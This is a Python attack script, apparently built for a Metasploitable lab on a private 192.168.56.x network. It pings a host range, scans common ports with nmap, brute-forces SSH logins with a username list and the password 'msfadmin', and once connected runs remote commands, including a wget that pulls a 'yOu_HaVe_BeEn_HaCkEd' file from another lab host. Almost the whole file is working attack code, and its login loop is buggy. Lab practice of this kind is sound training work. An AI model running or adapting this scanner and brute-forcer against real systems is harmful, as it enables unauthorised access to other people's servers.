import os
import sys
import threading
import nmap
import subprocess
import paramiko
import main
#import netifaces


IpList = []
SSHlist = []
usernames = []





def nmaper():
    portscan = nmap.PortScanner()
    scannedports = [20,21,22,23,25,53,67,68,69,80,110,443,1337,3389,13337]
    #portnum = 22
    for target in IpList:
        for portnum in (scannedports):
            results = portscan.scan(target, str(portnum))
            results = results['scan'][target]['tcp'][portnum]['state']
            if (results == "open"):
                print(f'{target} port {portnum} is {results}.')
                if (portnum == 22):
                    SSHlist.append(target)

        print("-----------------------------------")
    #once all open ports have been found
        
def open_file():
    with open('usernames.txt') as usernamefile:
            for line in usernamefile:
                usernames.append(line.rstrip())



def bruteforce():
    flag = False
    open_file()
    while (flag == False):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        for target in (SSHlist):
            for user in usernames:
                try:
                    client.connect(target, username=user, password='msfadmin')
                    flag = True
                except paramiko.ssh_exception.AuthenticationException:
                    flag = False
                except paramiko.ssh_exception.SSHException:
                    flag = False
                finally:
                    ssher(client)
                    flag = True
                    break
            break
    ##opening file




def ssher(client):
    command = 'ls'
    command2 = "wget http://192.168.56.101/yOu_HaVe_BeEn_HaCkEd"
    command3 = "cat yOu_HaVe_BeEn_HaCkEd"

    #client = paramiko.SSHClient()
    #client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    #for target in (SSHlist):
        #for user in usernames:
            #try:
    #client.connect(target, username=user, password='msfadmin')
 #               return True
 #           except paramiko.ssh_exception.AuthenticationException:
#                return False
    (stdin, stdout, stderr) = client.exec_command(command)
    lines = stdout.readlines()
    print(lines)
    (stdin, stdout, stderr) = client.exec_command(command2)
    lines = stdout.readlines()
    print(lines)
    (stdin, stdout, stderr) = client.exec_command(command3)
    lines = stdout.readlines()
    print(lines)

    client.close()





def ping():
    ipbase = "192.168.56."
    for x in range (100,110):
        ip = ipbase + str(x)
        if not os.system('ping -n 1 '+ip+' >'+ip):
            print(ip)
            IpList.append(ip)

    os.system('del '+ip)